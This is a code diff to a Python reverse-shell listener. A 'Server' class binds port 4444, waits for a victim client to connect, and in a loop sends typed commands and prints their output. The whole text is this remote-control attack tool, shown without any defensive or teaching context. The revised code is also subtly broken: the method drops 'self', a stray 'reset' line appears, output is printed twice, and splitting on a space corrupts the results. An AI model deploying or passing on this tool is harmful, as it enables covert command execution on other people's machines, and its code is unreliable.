@@ -20,35 +20,51 @@ else: ## linux distrib.
 init()
 
 class Server:
-    def start(self, port, SERVER_HOST="0.0.0.0"):
+    def start(SERVER_PORT=4444, SERVER_HOST="0.0.0.0"):
 
         print(f"{info}Server started")
 
-        BUFFER_SIZE = 1024 * 128
-        SEPARATOR = "<sep>"
 
+
+
+        BUFFER_SIZE = 1024 * 128
+
+        SEPARATOR = " "
         s = socket.socket()
-        s.bind((SERVER_HOST, int(port)))
+        s.bind((SERVER_HOST, SERVER_PORT))
+
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s.listen(5)
-        print(f"{success}Listening  on  {magenta}{SERVER_HOST}:{port}{reset}")
+        print(f"{info}Listening as {magenta}{SERVER_HOST}:{SERVER_PORT}{reset} ...")
+
+
         client_socket, client_address = s.accept()
-        print(f"{success}{cyan}{client_address[0]}:{client_address[1]} Connected")
-        currentWorkingDirectory = client_socket.recv(BUFFER_SIZE).decode()
+        print(f"{sub}{magenta}{client_address[0]}:{client_address[1]}{reset} Connected!")
+
+
+        cwd = client_socket.recv(BUFFER_SIZE).decode()
+        print(f"{info}Current working directory: {cyan}{cwd}{reset}")
+
         while True:
-
-            cmd = input(f"{cyan}{currentWorkingDirectory} $> ")
-
-            if not cmd.strip():
+            # get the command from prompt
+            command = input(f"{cyan}{cwd} {magenta}$> ")
+            reset
+            if not command.strip():
+                # empty command
                 continue
-            client_socket.send(cmd.encode())
-            if cmd.lower() == "exit":
+            # send the command to the client
+            client_socket.send(command.encode())
+            if command.lower() == "exit":
+                # if the command is exit, just break out of the loop
                 break
+            # retrieve command results
             output = client_socket.recv(BUFFER_SIZE).decode()
-            print(f"{cyan}---> {magenta}{output}{reset}")
-            results, currentWorkingDirectory = output.split()
-
+            print(output)
+            # split command output and current directory
+            results, cwd = output.split(SEPARATOR)
+            # print output
             print(results)
+        # close connection to the client
 
         client_socket.close()
         print(f"{attention}Client connection closed")
